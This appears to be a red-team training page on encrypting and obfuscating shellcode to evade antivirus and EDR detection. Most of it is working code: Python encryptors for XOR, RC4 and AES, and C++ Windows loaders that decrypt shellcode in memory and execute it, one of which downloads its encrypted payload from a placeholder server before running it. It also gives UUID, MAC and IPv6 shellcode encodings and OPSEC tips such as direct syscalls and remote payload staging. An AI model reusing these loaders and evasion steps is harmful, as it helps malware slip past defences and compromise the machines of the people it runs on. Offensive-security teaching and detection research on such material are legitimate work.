---
layout: training-page
title: "Payload Encryption & Obfuscation — Red Team Academy"
module: "Evasion"
tags:
  - shellcode
  - encryption
  - xor
  - aes
  - rc4
  - obfuscation
  - edr-bypass
page_key: "evasion-payload-encryption"
render_with_liquid: false
---

# Payload Encryption & Shellcode Obfuscation

Encrypting or encoding shellcode defeats signature-based detection by ensuring no recognizable byte pattern exists on disk or in memory until the moment of execution. The loader decrypts the payload at runtime, executes it, then optionally zeroes the decrypted buffer to reduce memory scan exposure.

## XOR Encryption

XOR is the simplest approach: `A XOR key = B`, and `B XOR key = A`. The same function encrypts and decrypts.

### Offline Encryption (Python)

```python
shellcode = open("shellcode.bin", "rb").read()
key = 0xAA

encrypted = bytes([b ^ key for b in shellcode])
open("shellcode.enc", "wb").write(encrypted)
```

### Runtime Loader (C++)

```cpp
#include <windows.h>

unsigned char encrypted_shellcode[] = {
    0x56, 0xe2, 0x29, 0x4e, // XOR'd shellcode bytes
    // ...
};

int main() {
    SIZE_T size = sizeof(encrypted_shellcode);
    unsigned char xor_key = 0xAA;

    // Allocate RW memory (avoid RWX — use two-step: RW then RX)
    LPVOID exec_mem = VirtualAlloc(nullptr, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) return -1;

    // Decrypt in place
    for (SIZE_T i = 0; i < size; ++i)
        ((unsigned char*)exec_mem)[i] = encrypted_shellcode[i] ^ xor_key;

    // Flip to executable
    DWORD old_protect;
    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old_protect);

    ((void(*)())exec_mem)();
    return 0;
}
```

### Evading XOR Detection

Static analyzers flag single-byte XOR due to recognizable patterns. Improvements:

- **Multi-byte rolling key**: `key[i % keylen]`
- **Key mutation per block**: XOR key with previous ciphertext byte
- **Dynamic key derivation**: derive from hostname, timestamp, or environment variable
- **JIT decryption**: decrypt one page at a time, immediately re-encrypt after use

---

## RC4 Encryption

RC4 is a stream cipher that produces high-entropy output — hard to pattern-match. Despite being cryptographically weak, it's widely used for obfuscation. Used by early Cobalt Strike staging, PlugX, and Lokibot.

### RC4 Implementation (C++)

```cpp
void rc4(unsigned char* data, size_t data_len,
         unsigned char* key, size_t key_len) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    // KSA — Key Scheduling Algorithm
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        std::swap(S[i], S[j]);
    }

    // PRGA — Pseudo Random Generation Algorithm
    int i = 0; j = 0;
    for (size_t k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        unsigned char rnd = S[(S[i] + S[j]) % 256];
        data[k] ^= rnd;
    }
}

int main() {
    SIZE_T size = sizeof(encrypted_shellcode);
    unsigned char key[] = "SecretKey123";

    LPVOID exec_mem = VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec_mem, encrypted_shellcode, size);

    rc4((unsigned char*)exec_mem, size, key, strlen((char*)key));

    DWORD old;
    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old);
    ((void(*)())exec_mem)();
    return 0;
}
```

### Python RC4 Encryptor

```python
def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)

    return bytes(result)

with open("shellcode.bin", "rb") as f:
    data = f.read()

enc = rc4_encrypt(data, b"SecretKey123")

with open("payload.rc4", "wb") as f:
    f.write(enc)
```

### OPSEC Improvements

- Replace `VirtualAlloc` with `NtAllocateVirtualMemory` (direct syscall)
- Replace `memcpy` with `RtlCopyMemory`
- Derive key from host properties (hostname hash, environment variable)
- Store encrypted payload remotely; download at runtime to keep payload off disk
- Stage payload in environment variables or registry

---

## AES-CBC Encryption

AES provides cryptographically strong encryption. Used by Cobalt Strike stageless beacons, Emotet, TrickBot, and PowerShell Empire. The Windows CryptoAPI handles AES natively without external libraries.

### Python AES Encryptor

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = b'\x90' * 16   # 16-byte AES-128 key
iv  = b'\x00' * 16   # initialization vector

with open('shellcode.bin', 'rb') as f:
    sc = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(sc, AES.block_size))

with open('payload.aes', 'wb') as f:
    f.write(enc)
```

### C++ AES-CBC Loader (Windows CryptoAPI)

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <vector>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")

bool aes_decrypt(std::vector<unsigned char>& data,
                 const BYTE* key, const BYTE* iv) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY  hKey  = NULL;
    HCRYPTHASH hHash = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, key, 16, 0))                   return false;
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash,
                         CRYPT_EXPORTABLE, &hKey))             return false;

    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);

    DWORD dataLen = (DWORD)data.size();
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dataLen)) return false;

    data.resize(dataLen);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

bool DownloadPayload(const char* url, std::vector<unsigned char>& data) {
    HINTERNET hNet  = InternetOpenA("Mozilla", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
    HINTERNET hFile = InternetOpenUrlA(hNet, url, 0, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) { InternetCloseHandle(hNet); return false; }

    unsigned char buf[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hFile, buf, sizeof(buf), &bytesRead) && bytesRead)
        data.insert(data.end(), buf, buf + bytesRead);

    InternetCloseHandle(hFile);
    InternetCloseHandle(hNet);
    return true;
}

int main() {
    const char* url = "http://yourserver.com/payload.aes";
    BYTE key[16] = { 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
                     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90 };
    BYTE iv[16]  = { 0 };

    std::vector<unsigned char> payload;
    if (!DownloadPayload(url, payload)) return -1;
    if (!aes_decrypt(payload, key, iv)) return -1;

    LPVOID exec = VirtualAlloc(0, payload.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload.data(), payload.size());
    ((void(*)())exec)();
    return 0;
}
```

---

## Format-Based Obfuscation: UUID, MAC, IPv6

Instead of raw hex or Base64, encode shellcode as data formats that appear harmless and evade YARA rules targeting standard payload patterns. DarkHydrus used IPv6/MAC formats in DNS TXT records to evade logging. HellShell automates all three formats.

### UUID Encoding (16 bytes per UUID)

**Python encoder:**
```python
import uuid

shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00" \
            b"\x00\x00\x41\x51\x41\x50\x52\x51"
uuids = []

for i in range(0, len(shellcode), 16):
    chunk = shellcode[i:i+16].ljust(16, b'\x00')
    u = uuid.UUID(bytes=chunk)
    uuids.append(str(u))

for u in uuids:
    print(f'"{u}",')
```

**C++ decoder (uses RPC runtime to parse UUID strings):**
```cpp
#include <windows.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

char* uuid_strs[] = {
    "fc488348-e8f0-00c0-4151-415052510000",
    // additional UUIDs...
};

void decode_uuids(unsigned char* buffer) {
    int offset = 0;
    for (int i = 0; i < sizeof(uuid_strs)/sizeof(uuid_strs[0]); i++) {
        UUID u;
        UuidFromStringA((RPC_CSTR)uuid_strs[i], &u);
        memcpy(buffer + offset, &u, 16);
        offset += 16;
    }
}
```

### MAC Address Encoding (6 bytes per MAC)

```cpp
// Encoded shellcode as MAC-like strings
const char* encoded[] = {
    "fc:48:83:e4:f0:e8",
    "c0:00:00:00:41:51",
    // ...
};

void decode_macs(unsigned char* buffer) {
    for (int i = 0, offset = 0;
         i < sizeof(encoded)/sizeof(encoded[0]);
         i++, offset += 6) {
        sscanf(encoded[i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &buffer[offset],   &buffer[offset+1], &buffer[offset+2],
            &buffer[offset+3], &buffer[offset+4], &buffer[offset+5]);
    }
}
```

### IPv6 Encoding (16 bytes per address)

```cpp
const char* ipv6_strs[] = {
    "fc48:83e4:f0e8:c000:0000:4151:4150:5251",
    // ...
};

void parse_ipv6(const char* ipv6, unsigned char* out) {
    unsigned short parts[8];
    sscanf(ipv6, "%hx:%hx:%hx:%hx:%hx:%hx:%hx:%hx",
        &parts[0], &parts[1], &parts[2], &parts[3],
        &parts[4], &parts[5], &parts[6], &parts[7]);
    for (int i = 0; i < 8; i++) {
        out[i*2]   = (parts[i] >> 8) & 0xFF;
        out[i*2+1] = parts[i] & 0xFF;
    }
}

void decode_ipv6_shellcode(unsigned char* buffer) {
    for (int i = 0, offset = 0;
         i < sizeof(ipv6_strs)/sizeof(ipv6_strs[0]);
         i++, offset += 16) {
        parse_ipv6(ipv6_strs[i], buffer + offset);
    }
}
```

### Execution After Format Decoding

```cpp
void execute_shellcode(unsigned char* shellcode, size_t size) {
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, size);

    DWORD old;
    VirtualProtect(exec, size, PAGE_EXECUTE_READ, &old);

    ((void(*)())exec)();

    // Zero memory after execution to reduce memory scan exposure
    SecureZeroMemory(exec, size);
}
```

---

## Encryption Strategy Comparison

| Method | Entropy | Speed | AV Resistance | Complexity |
|--------|---------|-------|---------------|------------|
| XOR (single byte) | Low | Fastest | Weak | Trivial |
| XOR (rolling key) | Medium | Fast | Moderate | Low |
| RC4 | High | Fast | Good | Low |
| AES-CBC | High | Moderate | Strong | Medium |
| UUID/MAC/IPv6 | Low (looks benign) | Slow | Strong (pattern evasion) | Medium |

---

## Resources

- HellShell (UUID/IPv6/MAC shellcode encoder) — `github.com/NUL0x4C/HellShell`
- SleepyCrypt (sleep-based XOR obfuscation) — `github.com/SolomonSklash/SleepyCrypt`
- pycryptodome (Python AES/RC4 library) — `github.com/Legrandin/pycryptodome`
- LOTS Project (legitimate hosting for payloads) — `lots-project.com`
- MITRE ATT&CK T1027 — Obfuscated Files or Information
